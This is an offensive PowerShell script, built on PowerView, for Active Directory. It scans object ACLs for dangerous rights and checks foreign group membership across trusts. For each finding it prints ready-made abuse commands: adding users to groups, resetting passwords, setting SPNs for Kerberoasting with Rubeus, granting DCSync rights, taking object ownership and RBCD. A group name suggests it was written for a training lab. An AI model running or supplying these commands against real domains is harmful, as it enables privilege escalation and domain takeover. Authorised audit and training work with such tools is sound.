# Requires Powerview
param(
    [Parameter(Mandatory = $true)]
    [string]$Domain
)

function Resolve-SID {
    param([Parameter(Mandatory)][object]$SidLike, [string]$Domain)
    $sidString = $null
    try {
        switch ($SidLike.GetType().FullName) {
            "System.String" { if ($SidLike -match '^S-\d-\d+(-\d+)+$') { $sidString = $SidLike } }
            "System.Byte[]" { $sidString = (New-Object System.Security.Principal.SecurityIdentifier($SidLike, 0)).Value }
            "System.Security.Principal.SecurityIdentifier" { $sidString = $SidLike.Value }
            default { try { $sidString = [string]$SidLike } catch {} }
        }
    } catch {}
    $name = $null
    if ($sidString) {
        try { $name = ConvertFrom-SID -ObjectSID $sidString -Domain $Domain -ErrorAction Stop }
        catch {
            try { $name = (New-Object System.Security.Principal.SecurityIdentifier($sidString)).Translate([System.Security.Principal.NTAccount]).Value }
            catch { $name = $null }
        }
    }
    [pscustomobject]@{ SidString = $sidString; Name = $name }
}

function Get-RightsColor {
    param([string]$Rights)
    if ($Rights -match 'GenericAll|WriteOwner|WriteDacl') { return 'Red' }
    if ($Rights -match 'GenericWrite|WriteProperty') { return 'Yellow' }
    return 'Green'
}

function New-AbuseHint {
    param(
        [string]$Rights, [string]$ObjectClass, [string]$ObjectName,
        [string]$TrusteeName, [string]$TrusteeSID, [string]$Domain
    )
    $who   = if ($TrusteeName) { $TrusteeName } else { $TrusteeSID }
    $obj   = if ($ObjectName)  { $ObjectName }  else { "<OBJECT>" }
    $class = ""
    if ($ObjectClass) { $class = $ObjectClass.ToLower() }

    $isGroup    = $class -match "group"
    $isUser     = $class -match "user"
    $isComputer = $class -match "computer"

    $whoParts = $who -split '\\',2
    $whoSam   = if ($whoParts.Count -eq 2) { $whoParts[1] } else { $whoParts[0] }

    $objParts = $obj -split '\\',2
    $objName  = if ($objParts.Count -eq 2) { $objParts[1] } else { $objParts[0] }

    $pv_AddToGroup = "Add-DomainGroupMember -Domain $Domain -Identity `"$objName`" -Members `"$who`""
    $ad_AddToGroup = "Add-ADGroupMember -Server $Domain -Identity `"$objName`" -Members `"$who`""
    $nt_AddToGroup = "net group `"$objName`" `"$whoSam`" /add /domain"

    $pv_ResetPass  = "Set-DomainUserPassword -Domain $Domain -Identity `"$objName`" -AccountPassword (Read-Host -AsSecureString)"
    $ad_ResetPass  = "Set-ADAccountPassword -Server $Domain -Identity `"$objName`" -Reset -NewPassword (Read-Host -AsSecureString)"

    $pv_SetSPN     = "Set-DomainObject -Domain $Domain -Identity `"$objName`" -Set @{'servicePrincipalName'='http/host'} ; Rubeus kerberoast /user:`"$objName`" /nowrap"
    $ds_SetSPN     = "setspn -S http/host `"$objName`""

    $pv_GrantDAcl  = "Add-DomainObjectAcl -Domain $Domain -TargetIdentity `"$objName`" -PrincipalIdentity `"$who`" -Rights All|ResetPassword|WriteMembers|DCSync"
    $pv_TakeOwn    = "Set-DomainObjectOwner -Domain $Domain -Identity `"$objName`" -OwnerIdentity `"$who`" ; $pv_GrantDAcl"

    $rbcd_Note     = "Set RBCD on `"$objName`" → abuse with S4U2self/S4U2proxy"

    if ($Rights -match "GenericAll") {
        if ($isGroup)    { return @("[ABUSE] Add to group:", "  PV : $pv_AddToGroup", "  AD : $ad_AddToGroup", "  NET: $nt_AddToGroup") }
        if ($isUser)     { return @("[ABUSE] Reset pwd or set SPN:", "  PV : $pv_ResetPass", "  AD : $ad_ResetPass", "  SPN: $pv_SetSPN", "  cmd: $ds_SetSPN") }
        if ($isComputer) { return @("[ABUSE] RBCD:", "  NOTE: $rbcd_Note") }
        return @("[ABUSE] Full control:", "  $pv_GrantDAcl")
    }
    if ($Rights -match "GenericWrite|WriteProperty") {
        if ($isGroup)    { return @("[ABUSE] Write member:", "  PV : $pv_AddToGroup", "  AD : $ad_AddToGroup", "  NET: $nt_AddToGroup") }
        if ($isUser)     { return @("[ABUSE] Set SPN or reset pwd:", "  PV : $pv_SetSPN", "  cmd: $ds_SetSPN", "  ALT: $pv_ResetPass") }
        if ($isComputer) { return @("[ABUSE] RBCD if allowed:", "  NOTE: $rbcd_Note") }
        return @("[ABUSE] Writable attrs")
    }
    if ($Rights -match "WriteDacl")  { return @("[ABUSE] Grant yourself GenericAll:", "  $pv_GrantDAcl") }
    if ($Rights -match "WriteOwner") { return @("[ABUSE] Take ownership then rights:", "  $pv_TakeOwn") }
    return @("[ABUSE] Manual review")
}

function Write-AclHit {
    param([pscustomobject]$R, [string]$Domain)
    $rightsColor = Get-RightsColor -Rights $R.Rights
    $trustee     = if ($R.TrusteeName) { $R.TrusteeName } else { $R.TrusteeSID }
    $target      = if ($R.ObjectName)  { $R.ObjectName }  else { $R.ObjectSID }
    $inheritCol  = if ($R.Inherited) { 'DarkGray' } else { 'White' }
    $abuseLines  = New-AbuseHint -Rights $R.Rights -ObjectClass $R.ObjectClass -ObjectName $R.ObjectName -TrusteeName $R.TrusteeName -TrusteeSID $R.TrusteeSID -Domain $Domain
    Write-Host "[RIGHTS] " -NoNewline -ForegroundColor DarkGray
    Write-Host $R.Rights -NoNewline -ForegroundColor $rightsColor
    Write-Host "  [TRUSTEE] " -NoNewline -ForegroundColor DarkGray
    Write-Host $trustee -NoNewline -ForegroundColor Cyan
    Write-Host "  [TARGET] " -NoNewline -ForegroundColor DarkGray
    Write-Host $target -NoNewline -ForegroundColor Magenta
    Write-Host "  [INHERITED] " -NoNewline -ForegroundColor DarkGray
    Write-Host $R.Inherited -ForegroundColor $inheritCol
    foreach ($line in $abuseLines) {
        if ($line -like "[ABUSE]*") { Write-Host "  $line" -ForegroundColor Yellow }
        else { Write-Host "  $line" -ForegroundColor DarkYellow }
    }
}

$DomainSidRaw = $null
try { $DomainSidRaw = Get-DomainSid -Domain $Domain -ErrorAction Stop } catch {}
$DomainSid = $null
if ($DomainSidRaw) {
    if ($DomainSidRaw -is [string]) { $DomainSid = $DomainSidRaw }
    elseif ($DomainSidRaw -is [byte[]]) { $DomainSid = (New-Object System.Security.Principal.SecurityIdentifier($DomainSidRaw,0)).Value }
    elseif ($DomainSidRaw.PSObject.Properties['Sid']) { $DomainSid = $DomainSidRaw.Sid }
}

$all = Get-DomainObjectAcl -Domain $Domain -ResolveGUIDs -Identity * -ErrorAction SilentlyContinue

$strict = $all | Where-Object {
    $_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner' -and
    $_.AceType -eq 'AccessAllowed' -and
    $_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$' -and
    ($DomainSid -and ($_.SecurityIdentifier -notmatch [Regex]::Escape($DomainSid)))
}

$loose = @()
if (-not $strict -or $strict.Count -eq 0) {
    $loose = $all | Where-Object {
        $_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner' -and
        $_.AceType -eq 'AccessAllowed'
    }
}

$usingSet = if ($strict -and $strict.Count -gt 0) { $strict } else { $loose }

$Results = $usingSet | ForEach-Object {
    $trustee = Resolve-SID -SidLike $_.SecurityIdentifier -Domain $Domain
    $obj     = Resolve-SID -SidLike $_.ObjectSID -Domain $Domain
    [pscustomobject]@{
        Rights      = $_.ActiveDirectoryRights
        ObjectClass = $_.ObjectClass
        TrusteeSID  = $trustee.SidString
        TrusteeName = $trustee.Name
        ObjectSID   = $obj.SidString
        ObjectName  = $obj.Name
        Inherited   = $_.IsInherited
        ObjectDN    = $_.ObjectDN
    }
} | Sort-Object ObjectName, TrusteeName

if (-not $Results -or $Results.Count -eq 0) {
    Write-Host "[!] No matching ACEs found" -ForegroundColor Yellow
    return
}

function Get-ForeignGroupMembership {
    param([string]$Domain)

    # 1) Try with FQDN
    try { $r1 = Get-DomainForeignUser -Domain $Domain -ErrorAction Stop } catch { $r1 = @() }
    if ($r1 -and $r1.Count -gt 0) { return $r1 }

    # 2) Try with no -Domain (PowerView auto-context)
    try { $r2 = Get-DomainForeignUser -ErrorAction Stop } catch { $r2 = @() }
    if ($r2 -and $r2.Count -gt 0) { return $r2 }

    # 3) Try with NetBIOS
    $netbios = ($Domain -split '\.')[0].ToUpper()
    try { $r3 = Get-DomainForeignUser -Domain $netbios -ErrorAction Stop } catch { $r3 = @() }
    if ($r3 -and $r3.Count -gt 0) { return $r3 }

    # 4) Manual fallback: enumerate groups in $Domain and flag members whose DN domain != $Domain
    $out = @()
    try { $groups = Get-DomainGroup -Domain $Domain -LDAPFilter '(member=*)' -ErrorAction Stop } catch { $groups = @() }
    foreach ($g in $groups) {
        if (-not $g.member) { continue }
        $gName = if ($g.samaccountname) { $g.samaccountname } else { $g.cn }
        foreach ($memDN in @($g.member)) {
            $dcs = [regex]::Matches($memDN,'DC=([^,]+)') | ForEach-Object { $_.Groups[1].Value }
            if ($dcs.Count -eq 0) { continue }
            $memDom = ($dcs -join '.').ToUpper()
            if ($memDom -ne $Domain.ToUpper()) {
                $uCN = ([regex]::Match($memDN,'CN=([^,]+)')).Groups[1].Value
                if (-not $uCN) { $uCN = $memDN }
                $out += [pscustomobject]@{
                    UserDomain = $memDom
                    UserName   = $uCN
                    GroupDomain= $Domain.ToUpper()
                    GroupName  = $gName
                }
            }
        }
    }
    return $out
}

$fgm = Get-ForeignGroupMembership -Domain $Domain

if ($fgm -and $fgm.Count -gt 0) {
    Write-Host ""
    Write-Host "=== FOREIGN GROUP MEMBERSHIP ===" -ForegroundColor Cyan
    foreach ($row in $fgm) {
        $uDom  = $row.UserDomain
        $uName = $row.UserName
        $gDom  = $row.GroupDomain
        $gName = $row.GroupName

        $abuse = @()
        if ($gName -match 'Domain Admins|Enterprise Admins|Administrators|Account Operators|Server Admins|Infrastructure|Schema Admins|Inlanefreight_admins|Inlanefreight_admins_bak') {
            $abuse += "[ABUSE] Leverage group privileges in ${gDom}:"
            $abuse += "  Get-DomainGroup -Identity '$gName' -Domain $gDom | select memberof "
            $abuse += "  (enumerate rights, add/remove members, reset passwords, pivot)"
        } else {
            # FIX: replace em dash & make it robust with -f formatting
            $abuse += ("[ABUSE] Member of {0}\{1} - enumerate privileges:" -f $gDom, $gName)
            $abuse += "  Get-DomainGroup -Identity '$gName' -Domain $gDom | select memberof "
        }

        # FIX: avoid interpolation ambiguity with -f formatting
        Write-Host ("[FOREIGN] {0}\{1}  ->  {2}\{3}" -f $uDom, $uName, $gDom, $gName) -ForegroundColor Magenta
        foreach ($line in $abuse) {
            if ($line -like "[ABUSE]*") { Write-Host "  $line" -ForegroundColor Yellow }
            else { Write-Host "  $line" -ForegroundColor DarkYellow }
        }
    }
} else {
    Write-Host ""
    Write-Host "=== FOREIGN GROUP MEMBERSHIP === none found" -ForegroundColor DarkGray
}

foreach ($r in $Results) { Write-AclHit -R $r -Domain $Domain }
